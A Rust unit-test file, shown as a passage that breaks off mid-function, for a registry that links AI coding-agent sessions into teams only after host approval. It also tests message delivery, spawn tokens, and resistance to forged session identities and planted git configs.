//! The session registry and the run and guide queues, driven through a fake system and fake banners.

use crate::registry::*;
use serde_json::{Value, json};
use std::cell::RefCell;
use std::collections::{BTreeMap, HashMap, HashSet};
use std::fs;
use std::path::{Path, PathBuf};
use std::rc::Rc;
use std::sync::{Mutex, MutexGuard};

const SESSION_A: &str = "aaaaaaaa-0000-4000-8000-000000000000";
const SESSION_B: &str = "bbbbbbbb-0000-4000-8000-000000000000";
const SESSION_C: &str = "cccccccc-0000-4000-8000-000000000000";
const OPENCODE_SESSION: &str = "ses_3f2a9c0b1ffeQkTz8mWn4rJd2L";
const RUN_A: &str = "aaaaaaaaaaaa";
const RUN_B: &str = "bbbbbbbbbbbb";
const ANSWERS_KEY: &str = "-home-theo-IdeaProjects-proj-a";
const CODEX_SESSION: &str = "cdx_c214e8c0c9458f09ea4300974071bcad955995188f33264e341800f8a2bb5fcb";

static ENVIRONMENT: Mutex<()> = Mutex::new(());

/// A temporary HOME, runtime and state folder, the run and guide queues in `root`.
struct Fixture {
    root: PathBuf,
    _lock: MutexGuard<'static, ()>,
}

impl Fixture {
    fn new() -> Self {
        let lock = ENVIRONMENT.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
        let root = std::env::temp_dir().join(format!("osd-test-{}", cockpit::util::token_hex(6)));
        for folder in ["home", "run", "state", "queue"] {
            fs::create_dir_all(root.join(folder)).unwrap();
        }
        // SAFETY: the lock above keeps every test that touches the environment one at a time.
        unsafe {
            std::env::set_var("HOME", root.join("home"));
            std::env::set_var("XDG_RUNTIME_DIR", root.join("run"));
            std::env::set_var("XDG_STATE_HOME", root.join("state"));
            std::env::set_var("CLAUDE_SESSIONS_STATE_HOME", root.join("state"));
            // The audit log goes under state/; never into the real journal.
            std::env::set_var("CLAUDE_AUDIT_JOURNAL", "off");
            std::env::set_var("CLAUDE_RUNS_DIR", root.join("queue"));
            std::env::set_var("CLAUDE_ANSWERS_DIR", root.join("answers"));
            for name in ["CLAUDE_SESSIONS_CLONES", "HYPRLAND_INSTANCE_SIGNATURE"] {
                std::env::remove_var(name);
            }
        }
        // Run and guide requests as the daemon holds them (hold_request), naming their answers folder.
        fs::create_dir_all(root.join("run/claude-requests")).unwrap();
        for id in [RUN_A, RUN_B] {
            for extension in ["request", "guide"] {
                fs::write(root.join("run/claude-requests").join(format!("{id}.{extension}")), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
            }
        }
        Fixture { root, _lock: lock }
    }

    fn queue(&self) -> PathBuf {
        self.root.join("queue")
    }

    /// Theo's answers, "runs" or "guides", in the folder the requests name (cockpit::approval::answers_dir).
    fn answers(&self, kind: &str) -> PathBuf {
        let directory = self.root.join("answers").join(ANSWERS_KEY).join(kind);
        fs::create_dir_all(&directory).unwrap();
        directory
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

#[derive(Default)]
struct FakeWindow {
    command: Vec<String>,
    closed: bool,
}

struct SharedWindow(Rc<RefCell<FakeWindow>>);

impl Window for SharedWindow {
    fn running(&mut self) -> bool {
        !self.0.borrow().closed
    }
    fn terminate(&mut self) {
        self.0.borrow_mut().closed = true;
    }
}

/// What the fake system answers, and what was asked of it.
#[derive(Default)]
struct World {
    commands: Vec<Vec<String>>,
    windows: Vec<Rc<RefCell<FakeWindow>>>,
    on_cockpit: bool,
    gaming: bool,
    in_meeting: bool,
    live_ids: HashSet<String>,
    claude_panes: HashSet<String>,
    /// capture-pane: pane -> its last lines
    pane_tails: HashMap<String, String>,
    /// display-message for a pane: the tmux session name
    session_name: Option<String>,
    /// list-clients: client pids, one per line
    clients: String,
    environments: HashMap<String, HashMap<String, String>>,
    dead_pids: HashSet<String>,
    /// sender pid -> the focus target its trusted ancestor carries
    sender_targets: HashMap<u32, BTreeMap<String, String>>,
    sender_directories: HashMap<u32, String>,
    sender_runtimes: HashMap<u32, String>,
    default_agent: Option<String>,
    /// sender pid -> CLAUDE_SESSIONS_TEAM_SPAWN in its launch's host environment
    spawn_tokens: HashMap<u32, String>,
    /// start_detached commands, in order
    started: Vec<Vec<String>>,
    /// start_detached reports that nothing could be started
    start_fails: bool,
}

impl World {
    fn hyprctl_calls(&self) -> Vec<String> {
        self.commands.iter().filter(|command| command[0] == "hyprctl").map(|command| command[2].clone()).collect()
    }
}

struct FakeSystem(Rc<RefCell<World>>);

impl System for FakeSystem {
    fn run(&mut self, command: &[&str], _ok: &[i32]) -> bool {
        self.0.borrow_mut().commands.push(command.iter().map(|part| part.to_string()).collect());
        true
    }

    fn tmux(&mut self, arguments: &[&str]) -> Option<String> {
        let world = self.0.borrow();
        match arguments[0] {
            "capture-pane" => Some(world.pane_tails.get(arguments[3]).cloned().unwrap_or_default()),
            "display-message" => world.session_name.clone(),
            "list-clients" => Some(world.clients.clone()),
            _ => Some(String::new()),
        }
    }

    fn open_window(&mut self, command: &[&str]) -> Option<Box<dyn Window>> {
        let window = Rc::new(RefCell::new(FakeWindow { command: command.iter().map(|part| part.to_string()).collect(), closed: false }));
        self.0.borrow_mut().windows.push(window.clone());
        Some(Box::new(SharedWindow(window)))
    }

    fn claude_workspace_active(&mut self) -> bool { self.0.borrow().on_cockpit }
    fn gaming(&mut self) -> bool { self.0.borrow().gaming }
    fn in_meeting(&mut self) -> bool { self.0.borrow().in_meeting }
    fn live_session_ids(&mut self) -> HashSet<String> { self.0.borrow().live_ids.clone() }
    fn claude_panes(&mut self) -> HashSet<String> { self.0.borrow().claude_panes.clone() }

    fn process_environment(&mut self, pid: &str) -> HashMap<String, String> {
        self.0.borrow().environments.get(pid).cloned().unwrap_or_default()
    }

    fn process_alive(&mut self, pid: &str) -> bool {
        !self.0.borrow().dead_pids.contains(pid)
    }

    fn sender_target(&mut self, sender: u32) -> Option<BTreeMap<String, String>> {
        self.0.borrow().sender_targets.get(&sender).cloned()
    }

    fn sender_directory(&mut self, sender: u32) -> Option<String> {
        self.0.borrow().sender_directories.get(&sender).cloned()
    }
    fn sender_runtime(&mut self, sender: u32) -> Option<String> { self.0.borrow().sender_runtimes.get(&sender).cloned() }
    fn runtime_is_live(&mut self, runtime: &str) -> bool { self.0.borrow().sender_runtimes.values().any(|known| known == runtime) }
    fn default_agent(&mut self) -> Option<String> { self.0.borrow().default_agent.clone() }
    fn sender_spawn_token(&mut self, sender: u32) -> Option<String> { self.0.borrow().spawn_tokens.get(&sender).cloned() }
    fn start_detached(&mut self, command: &[&str]) -> bool {
        self.0.borrow_mut().started.push(command.iter().map(|part| part.to_string()).collect());
        !self.0.borrow().start_fails
    }
}

fn team_bench() -> Bench {
    let mut bench = Bench::new();
    let project = bench.fixture.root.join("home/IdeaProjects/project-a");
    fs::create_dir_all(project.join(".git")).unwrap();
    fs::write(project.join(".git/config"), "[remote \"origin\"]\n\turl = git@github.com:example/project-a.git\n").unwrap();
    fs::create_dir_all(cockpit::paths::state_dir()).unwrap();
    fs::write(cockpit::paths::todo(), json!({"items":[{"id":"1d3fd318","project":"project-a","text":"Team task","status":"doing"}]}).to_string()).unwrap();
    for (peer, session, agent) in [(10,SESSION_A,"claude"),(20,OPENCODE_SESSION,"opencode"),(30,SESSION_B,"claude")] {
        bench.world.borrow_mut().sender_targets.insert(peer, target(&[("tmux_pane", format!("%{peer}").as_str())]));
        bench.world.borrow_mut().sender_directories.insert(peer, project.to_string_lossy().into_owned());
        bench.world.borrow_mut().sender_runtimes.insert(peer, format!("runtime-{peer}"));
        let report = parse_session(&json!({"session":session,"agent":agent,"project":"project-a","cwd":project,"state":"waiting"}).to_string()).unwrap();
        bench.registry.report_from(report, peer).unwrap();
    }
    bench
}

#[test]
fn team_context_exposes_only_own_identity_before_link_approval() {
    let mut bench = team_bench();
    let result = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(result["session_id"], SESSION_A);
    assert!(result["members"].as_array().unwrap().is_empty());
    assert!(!result.to_string().contains(OPENCODE_SESSION));
    assert!(!result.to_string().contains(SESSION_B));
    assert!(crate::teams::request(&mut bench.registry, 99, cockpit::teams::AgentAction::Context).is_err());
}

#[test]
fn agent_team_proposals_remain_pending_until_the_host_approves_the_exact_mapping() {
    use cockpit::teams::{AgentAction,HostAction,Member,Proposal,Role,TaskKey};
    let mut bench = team_bench();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    let task = TaskKey { project:own["project"].as_str().unwrap().into(),task_id:"1d3fd318".into() };
    let proposal = Proposal { submission_key:"link-1".into(),task,members:vec![Member {session_id:SESSION_A.into(),role:Role::Designer},
        Member {session_id:OPENCODE_SESSION.into(),role:Role::Developer}],reason:"Review this task".into() };
    let pending = crate::teams::request(&mut bench.registry, 10, AgentAction::Propose {proposal}).unwrap().result.unwrap();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    assert!(own["members"].as_array().unwrap().is_empty());
    crate::teams::host_control(&mut bench.registry, &HostAction::Approve {request_id:"host-approval".into(),
        proposal_id:pending["proposal_id"].as_str().unwrap().into(),expected_revision:1,mapping_hash:pending["mapping_hash"].as_str().unwrap().into()}).unwrap();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    assert_eq!(own["members"].as_array().unwrap().len(), 2);
}

fn linked_team_bench() -> Bench {
    use cockpit::teams::{AgentAction,HostAction,Member,Proposal,Role,TaskKey};
    let mut bench = team_bench();
    let own = crate::teams::request(&mut bench.registry, 10, AgentAction::Context).unwrap().result.unwrap();
    let task = TaskKey { project: own["project"].as_str().unwrap().into(), task_id: "1d3fd318".into() };
    let proposal = Proposal { submission_key: "link-1".into(), task, members: vec![Member { session_id: SESSION_A.into(), role: Role::Designer },
        Member { session_id: OPENCODE_SESSION.into(), role: Role::Developer }], reason: "Review this task".into() };
    let pending = crate::teams::request(&mut bench.registry, 10, AgentAction::Propose { proposal }).unwrap().result.unwrap();
    crate::teams::host_control(&mut bench.registry, &HostAction::Approve { request_id: "host-approval".into(),
        proposal_id: pending["proposal_id"].as_str().unwrap().into(), expected_revision: 1,
        mapping_hash: pending["mapping_hash"].as_str().unwrap().into() }).unwrap();
    bench
}

fn send_to_designer(bench: &mut Bench, key: &str) {
    use cockpit::teams::{AgentAction, MessageKind, Submission, TaskKey};
    let own = crate::teams::request(&mut bench.registry, 20, AgentAction::Context).unwrap().result.unwrap();
    let task: TaskKey = serde_json::from_value(own["task"].clone()).unwrap();
    let message = Submission { task, submission_key: key.into(), recipient: SESSION_A.into(), kind: MessageKind::Notice,
        body: "The frame is ready.".into(), thread_id: None, handoff_id: None };
    crate::teams::request(&mut bench.registry, 20, AgentAction::Send { message }).unwrap().result.unwrap();
}

#[test]
fn a_working_recipient_gets_nothing_until_its_turn_ends() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    bench.report(SESSION_A, json!({"state": "working"}));
    let busy = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(busy.is_null());
    bench.report(SESSION_A, json!({"state": "waiting"}));
    let idle = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(idle["dispatch_id"].is_string());
}

#[test]
fn each_idle_period_after_a_new_turn_takes_the_next_message() {
    use cockpit::teams::{AgentAction, TransportOutcome};
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    send_to_designer(&mut bench, "notice-2");
    for expected in ["notice-1", "notice-2"] {
        let delivery = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
        assert!(delivery["dispatch_id"].is_string(), "no delivery for {expected}");
        crate::teams::request(&mut bench.registry, 10, AgentAction::Receipt { dispatch_id: delivery["dispatch_id"].as_str().unwrap().into(),
            outcome: TransportOutcome::Received { native_id: expected.into() } }).unwrap();
        bench.report(SESSION_A, json!({"state": "working"}));
        std::thread::sleep(std::time::Duration::from_millis(2));
        bench.report(SESSION_A, json!({"state": "waiting"}));
    }
}

#[test]
fn after_a_daemon_restart_linked_members_keep_receiving() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    // A restarted daemon reloads sessions from its snapshot, without their launch proof.
    bench.registry.sessions.get_mut(SESSION_A).unwrap().runtime.clear();
    bench.registry.teams = None;
    let delivery = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(delivery["text"].as_str().unwrap().contains("The frame is ready."));
}

#[test]
fn another_launch_cannot_take_over_a_live_sessions_identity() {
    let mut bench = team_bench();
    bench.world.borrow_mut().sender_targets.insert(99, target(&[("tmux_pane", "%99")]));
    bench.world.borrow_mut().sender_runtimes.insert(99, "runtime-99".into());
    let forged = parse_session(&json!({"session": SESSION_A, "agent": "claude", "project": "project-a", "state": "waiting"}).to_string()).unwrap();
    assert!(bench.registry.report_from(forged, 99).is_err());
    assert_eq!(bench.registry.sessions[SESSION_A].runtime, "runtime-10");
}

#[test]
fn a_session_restarted_after_its_old_launch_ended_takes_its_new_launch() {
    let mut bench = team_bench();
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    bench.world.borrow_mut().sender_targets.insert(11, target(&[("tmux_pane", "%10")]));
    bench.world.borrow_mut().sender_runtimes.insert(11, "runtime-11".into());
    let restarted = parse_session(&json!({"session": SESSION_A, "agent": "claude", "project": "project-a", "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(restarted, 11).unwrap();
    assert_eq!(bench.registry.sessions[SESSION_A].runtime, "runtime-11");
}

#[test]
fn a_planted_git_origin_cannot_choose_the_team_project() {
    let bench = team_bench();
    let primary = bench.fixture.root.join("home/IdeaProjects/project-a");
    let impostor = bench.fixture.root.join("home/IdeaProjects/impostor");
    fs::create_dir_all(impostor.join(".git")).unwrap();
    fs::write(impostor.join(".git/config"), "[remote \"origin\"]\n url = git@github.com:example/project-a.git\n").unwrap();
    let pointing = bench.fixture.root.join("home/IdeaProjects/pointing");
    fs::create_dir_all(&pointing).unwrap();
    fs::write(pointing.join(".git"), format!("gitdir: {}\n", primary.join(".git").display())).unwrap();
    let identity = |path: &std::path::Path| crate::teams::canonical_project(path.to_str().unwrap()).unwrap();
    assert_ne!(identity(&impostor), identity(&primary));
    assert_ne!(identity(&pointing), identity(&primary));
    assert!(!identity(&impostor).contains("github.com"));
}

fn recruit_designer() -> cockpit::teams::AgentAction {
    cockpit::teams::AgentAction::Recruit { recruitment: cockpit::teams::Recruitment { submission_key: "recruit-1".into(),
        task: cockpit::teams::TaskKey { project: String::new(), task_id: "1d3fd318".into() }, role: cockpit::teams::Role::Developer,
        recruits: vec![cockpit::teams::Recruit { role: cockpit::teams::Role::Designer, brief: "Design the jobs list".into() }],
        reason: "The UI needs a design".into() } }
}

fn with_own_project(bench: &mut Bench, action: cockpit::teams::AgentAction) -> cockpit::teams::AgentAction {
    let own = crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap().result.unwrap();
    let cockpit::teams::AgentAction::Recruit { mut recruitment } = action else { return action };
    recruitment.task.project = own["project"].as_str().unwrap().into();
    cockpit::teams::AgentAction::Recruit { recruitment }
}

#[test]
fn a_recruit_request_records_the_default_agent() {
    let mut bench = team_bench();
    bench.world.borrow_mut().default_agent = Some("opencode".into());
    let action = with_own_project(&mut bench, recruit_designer());
    crate::teams::request(&mut bench.registry, 20, action).unwrap().result.unwrap();
    let snapshot = crate::teams::host(&mut bench.registry, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    assert_eq!(snapshot["proposals"][0]["spawn_agent"], "opencode");
}

#[test]
fn an_unreadable_default_agent_refuses_the_recruit_request() {
    let mut bench = team_bench();
    let action = with_own_project(&mut bench, recruit_designer());
    let refused = crate::teams::request(&mut bench.registry, 20, action).unwrap_err();
    assert!(refused.message.contains("default agent"), "{}", refused.message);
}

#[test]
fn the_default_agent_follows_the_cockpit_settings_rules() {
    let bench = Bench::new();
    let settings = bench.fixture.root.join("settings.json");
    assert_eq!(crate::registry::default_agent_in(&settings).as_deref(), Some("claude"));
    for (text, expected) in [(r#"{}"#, Some("claude")), (r#"{"default-agent":"opencode"}"#, Some("opencode")),
                             (r#"{"default-agent":"nobody"}"#, None), (r#"{"default-agent":3}"#, None), ("[]", None), ("not json", None)] {
        fs::write(&settings, text).unwrap();
        assert_eq!(crate::registry::default_agent_in(&settings).as_deref(), expected, "{text}");
    }
}

const NEW_SESSION: &str = "cccccccc-0000-4000-8000-000000000000";

fn recruit_and_approve(bench: &mut Bench, recruits: Vec<cockpit::teams::Recruit>) {
    use cockpit::teams::{AgentAction, HostAction};
    bench.world.borrow_mut().default_agent = Some("claude".into());
    let AgentAction::Recruit { mut recruitment } = with_own_project(bench, recruit_designer()) else { unreachable!() };
    recruitment.recruits = recruits;
    let pending = crate::teams::request(&mut bench.registry, 20, AgentAction::Recruit { recruitment }).unwrap().result.unwrap();
    crate::teams::host_control(&mut bench.registry, &HostAction::Approve { request_id: "approve-recruit".into(),
        proposal_id: pending["proposal_id"].as_str().unwrap().into(), expected_revision: 1,
        mapping_hash: pending["mapping_hash"].as_str().unwrap().into() }).unwrap().result.unwrap();
}

fn recruit(role: cockpit::teams::Role, brief: &str) -> cockpit::teams::Recruit { cockpit::teams::Recruit { role, brief: brief.into() } }

fn started(bench: &Bench) -> Vec<Vec<String>> { bench.world.borrow().started.clone() }

/// A session started by the cockpit reports from peer `peer`, its launch carrying `token`.
fn spawned_session_reports(bench: &mut Bench, peer: u32, session: &str, token: &str) {
    let project = bench.fixture.root.join("home/IdeaProjects/project-a");
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(peer, target(&[("tmux_pane", format!("%{peer}").as_str())]));
        world.sender_directories.insert(peer, project.to_string_lossy().into_owned());
        world.sender_runtimes.insert(peer, format!("runtime-{peer}"));
        if !token.is_empty() { world.spawn_tokens.insert(peer, token.into()); }
    }
    let report = parse_session(&json!({"session": session, "agent": "claude", "project": "project-a", "cwd": project, "state": "waiting"}).to_string()).unwrap();
    bench.registry.report_from(report, peer).unwrap();
}

fn role_of(bench: &mut Bench, session: &str) -> Option<String> {
    let snapshot = crate::teams::host(&mut bench.registry, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    snapshot["members"].as_array().unwrap().iter().find(|member| member["session_id"] == session).map(|member| member["role"].as_str().unwrap().to_string())
}

fn developer_hands_off(bench: &mut Bench, key: &str, commit: &str) {
    use cockpit::teams::{AgentAction, Handoff};
    let own = crate::teams::request(&mut bench.registry, 20, AgentAction::Context).unwrap().result.unwrap();
    let task = cockpit::teams::TaskKey { project: own["project"].as_str().unwrap().into(), task_id: "1d3fd318".into() };
    let handoff = Handoff { task, submission_key: key.into(), branch: "feature/jobs".into(), commit: commit.into(), checkout: "/elsewhere".into(),
        summary: "Jobs list built.".into(), tests: "cargo test: 12 passed".into(), figcraft: vec![] };
    crate::teams::request(&mut bench.registry, 20, AgentAction::Handoff { handoff }).unwrap().result.unwrap();
}

#[test]
fn approving_a_recruit_request_starts_each_teammate_detached() {
    let mut bench = team_bench();
    recruit_and_approve(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let starts = started(&bench);
    assert_eq!(starts.len(), 1, "{starts:?}");
    let project = bench.fixture.root.join("home/IdeaProjects/project-a").to_string_lossy().into_owned();
    assert_eq!(starts[0][..4], ["claude-sessions", "--agent", "claude", "team-spawn"]);
    assert!(starts[0][4].len() == 32 && starts[0][4].bytes().all(|byte| byte.is_ascii_hexdigit()));
    assert_eq!(starts[0][5..], ["designer", project.as_str(), "-", "Brief written by your team's developer agent and approved by Theo:\nDesign the jobs list"]);
    crate::teams::request(&mut bench.registry, 20, cockpit::teams::AgentAction::Context).unwrap();
    assert_eq!(started(&bench).len(), 1, "a started teammate is never started twice");
}

#[test]
fn a_start_that_cannot_be_launched_shows_as_failed_at_once_and_is_never_retried() {
    // Todo f4a5eb57.
    let mut bench = team_bench();
    bench.world.borrow_mut().start_fails = true;
    recruit_and_approve(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let snapshot = crate::teams::host(&mut bench.registry, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    assert_eq!(snapshot["spawns"][0]["status"], "failed");
    assert_eq!(started(&bench).len(), 1);
}

#[test]
fn a_session_launched_with_its_token_joins_the_team_as_its_role() {
    let mut bench = team_bench();
    recruit_and_approve(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    let token = started(&bench)[0][4].clone();
    spawned_session_reports(&mut bench, 40, NEW_SESSION, &token);
    assert_eq!(role_of(&mut bench, NEW_SESSION).as_deref(), Some("designer"));
}

#[test]
fn a_session_without_its_launch_token_joins_nothing() {
    let mut bench = team_bench();
    recruit_and_approve(&mut bench, vec![recruit(cockpit::teams::Role::Designer, "Design the jobs list")]);
    spawned_session_reports(&mut bench, 40, NEW_SESSION, "");
    spawned_session_reports(&mut bench, 41, "dddddddd-0000-4000-8000-000000000000", &"0".repeat(32));
    assert_eq!(role_of(&mut bench, NEW_SESSION), None);
    assert_eq!(role_of(&mut bench, "dddddddd-0000-4000-8000-000000000000"), None);
}

#[test]
fn a_handoff_exits_the_previous_qa_and_starts_the_next() {
    use cockpit::teams::Role;
    let mut bench = team_bench();
    recruit_and_approve(&mut bench, vec![recruit(Role::Designer, "Design the jobs list"), recruit(Role::Qa, "Check contrast")]);
    let commit_a = "a".repeat(40);
    developer_hands_off(&mut bench, "h1", &commit_a);
    let project = bench.fixture.root.join("home/IdeaProjects/project-a").to_string_lossy().into_owned();
    let qa_start = started(&bench).into_iter().find(|command| command[5] == "qa").expect("no QA start");
    assert_eq!(qa_start[6..8], [project.as_str(), commit_a.as_str()], "QA is copied from the Developer's real folder, at the commit");
    spawned_session_reports(&mut bench, 43, NEW_SESSION, &qa_start[4]);
    assert_eq!(role_of(&mut bench, NEW_SESSION).as_deref(), Some("qa"));
    developer_hands_off(&mut bench, "h2", &"b".repeat(40));
    let starts = started(&bench);
    assert!(starts.contains(&vec!["claude-sessions".to_string(), "exit".into(), NEW_SESSION.into()]), "{starts:?}");
    assert_eq!(starts.iter().filter(|command| command.get(5).is_some_and(|role| role == "qa")).count(), 2);
    assert_eq!(role_of(&mut bench, NEW_SESSION), None);
}

#[test]
fn only_host_processes_may_use_the_team_host_socket() {
    let tree = Tree(vec![("50", Some("30"), "sandbox", environment(&[])), ("30", None, "host", environment(&[]))]);
    assert!(crate::teams::host_peer_allowed(&tree, "30"));
    assert!(!crate::teams::host_peer_allowed(&tree, "50"));
    assert!(!crate::teams::host_peer_allowed(&tree, "999"));
}

#[test]
fn the_host_snapshot_lists_verified_sessions() {
    let mut bench = team_bench();
    let snapshot = crate::teams::host(&mut bench.registry, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    let sessions = snapshot["sessions"].as_array().unwrap();
    assert_eq!(sessions.len(), 3);
    let row = |id: &str| sessions.iter().find(|row| row["session_id"] == id).unwrap().clone();
    assert_eq!(row(SESSION_A)["project_name"], "project-a");
}

#[test]
fn a_recipient_pulls_one_message_per_observed_turn_state() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    send_to_designer(&mut bench, "notice-2");
    let first = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(first["text"].as_str().unwrap().contains("The frame is ready."));
    assert!(!first["dispatch_id"].as_str().unwrap().is_empty());
    let again = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(again.is_null());
}

#[test]
fn only_the_recipient_session_can_acknowledge_its_delivery() {
    use cockpit::teams::{AgentAction, TransportOutcome};
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    let dispatch = crate::teams::request(&mut bench.registry, 10, AgentAction::Receive).unwrap().result.unwrap();
    let receipt = AgentAction::Receipt { dispatch_id: dispatch["dispatch_id"].as_str().unwrap().into(),
        outcome: TransportOutcome::Received { native_id: "native-1".into() } };
    assert!(crate::teams::request(&mut bench.registry, 20, receipt.clone()).and_then(|reply| reply.result).is_err());
    crate::teams::request(&mut bench.registry, 10, receipt).unwrap().result.unwrap();
}

#[test]
fn a_session_waiting_for_theo_is_not_woken_by_collaborators() {
    let mut bench = linked_team_bench();
    send_to_designer(&mut bench, "notice-1");
    bench.registry.sessions.get_mut(SESSION_A).unwrap().needs_input = true;
    let result = crate::teams::request(&mut bench.registry, 10, cockpit::teams::AgentAction::Receive).unwrap().result.unwrap();
    assert!(result.is_null());
}

#[test]
fn different_repositories_with_the_same_directory_name_have_distinct_team_identities() {
    let bench = Bench::new();
    let left = bench.fixture.root.join("left/project");
    let right = bench.fixture.root.join("right/project");
    for (root, remote) in [(&left,"git@github.com:example/one.git"),(&right,"git@github.com:example/two.git")] {
        fs::create_dir_all(root.join(".git")).unwrap();
        fs::write(root.join(".git/config"), format!("[remote \"origin\"]\n url = {remote}\n")).unwrap();
    }
    assert_ne!(crate::teams::canonical_project(left.to_str().unwrap()).unwrap(),crate::teams::canonical_project(right.to_str().unwrap()).unwrap());
}

#[test]
fn managed_clones_can_share_a_team_without_executing_repository_git_config() {
    let bench = team_bench();
    let primary = bench.fixture.root.join("home/IdeaProjects/project-a");
    let clone = bench.fixture.root.join("home/IdeaProjects/.parallel/project-a/review");
    fs::create_dir_all(clone.join(".git")).unwrap();
    fs::write(clone.join(".git/config"), format!("[remote \"origin\"]\n url = {}\n[core]\n hooksPath = /do-not-execute\n",primary.display())).unwrap();
    assert_eq!(crate::teams::canonical_project(primary.to_str().unwrap()).unwrap(),crate::teams::canonical_project(clone.to_str().unwrap()).unwrap());
    assert!(bench.world.borrow().commands.iter().all(|command| command.first().map(String::as_str) != Some("git")));
}

#[derive(Default)]
struct Shown {
    raised: Vec<String>,
    dropped: Vec<String>,
}

struct FakeBanners(Rc<RefCell<Shown>>);

impl Banners for FakeBanners {
    fn raise_banner(&mut self, banner: &Banner) {
        self.0.borrow_mut().raised.push(banner.session.clone());
    }
    fn raise_notice(&mut self, notice: &Notice) {
        self.0.borrow_mut().raised.push(notice.id.clone());
    }
    fn drop_banner(&mut self, key: &str) {
        self.0.borrow_mut().dropped.push(key.into());
    }
    fn showing(&self, key: &str) -> bool {
        let shown = self.0.borrow();
        shown.raised.iter().any(|raised| raised == key) && !shown.dropped.iter().any(|dropped| dropped == key)
    }
}

/// A registry on a fresh fixture, with handles on what it did.
struct Bench {
    fixture: Fixture,
    world: Rc<RefCell<World>>,
    shown: Rc<RefCell<Shown>>,
    registry: Registry,
}

impl Bench {
    fn new() -> Self {
        Self::with(Fixture::new(), World::default())
    }

    fn with(fixture: Fixture, world: World) -> Self {
        let world = Rc::new(RefCell::new(world));
        let shown = Rc::new(RefCell::new(Shown::default()));
        let registry = Registry::new(Box::new(FakeSystem(world.clone())), Box::new(FakeBanners(shown.clone())));
        Bench { fixture, world, shown, registry }
    }

    fn report(&mut self, session: &str, fields: Value) {
        let mut report = json!({"session": session, "project": "p"});
        report.as_object_mut().unwrap().extend(fields.as_object().unwrap().clone());
        self.registry.update(parse_session(&report.to_string()).unwrap());
    }

    fn snapshot(&self) -> Vec<Value> {
        let text = fs::read_to_string(cockpit::paths::snapshot()).unwrap();
        serde_json::from_str::<Value>(&text).unwrap()["sessions"].as_array().unwrap().clone()
    }

    fn raised(&self) -> Vec<String> {
        self.shown.borrow().raised.clone()
    }

    fn dropped(&self) -> Vec<String> {
        self.shown.borrow().dropped.clone()
    }

    fn windows(&self) -> Vec<Rc<RefCell<FakeWindow>>> {
        self.world.borrow().windows.clone()
    }

    fn commands(&self) -> Vec<Vec<String>> {
        self.world.borrow().commands.clone()
    }
}

#[test]
fn codex_native_identity_is_retained_for_exact_resume() {
    let mut bench = Bench::new();
    bench.report(CODEX_SESSION, json!({"agent": "codex", "native_thread": SESSION_A, "state": "working", "cwd": "/projects/p"}));
    let rows = bench.snapshot();
    assert_eq!(rows[0]["native_thread"], SESSION_A);
    assert_eq!(rows[0]["agent"], "codex");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[CODEX_SESSION]["native_thread"], SESSION_A);
}

#[test]
fn codex_cannot_claim_a_claude_id_or_another_native_thread() {
    for (session, agent, native) in [(SESSION_A, "codex", SESSION_A), (CODEX_SESSION, "codex", SESSION_B),
        (CODEX_SESSION, "claude", SESSION_A), (SESSION_A, "claude", SESSION_A)] {
        assert!(parse_session(&json!({"session": session, "project": "p", "agent": agent, "native_thread": native}).to_string()).is_err());
    }
    assert!(parse_session(&json!({"session": CODEX_SESSION, "project": "p", "agent": "codex"}).to_string()).is_err());
}

#[test]
fn codex_native_claims_cannot_rebind_another_live_pane() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(10, BTreeMap::from([("tmux_pane".into(), "%10".into())]));
    bench.world.borrow_mut().sender_targets.insert(20, BTreeMap::from([("tmux_pane".into(), "%20".into())]));
    bench.world.borrow_mut().claude_panes.insert("%10".into());
    let report = parse_session(&json!({"session": CODEX_SESSION, "native_thread": SESSION_A, "agent": "codex", "project": "p", "state": "working"}).to_string()).unwrap();
    bench.registry.report_from(report.clone(), 10).unwrap();
    assert!(bench.registry.report_from(report, 20).is_err());
    assert_eq!(bench.registry.sessions[CODEX_SESSION].target["tmux_pane"], "%10");
}

fn target(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs.iter().map(|(key, value)| (key.to_string(), value.to_string())).collect()
}

fn set(items: &[&str]) -> HashSet<String> {
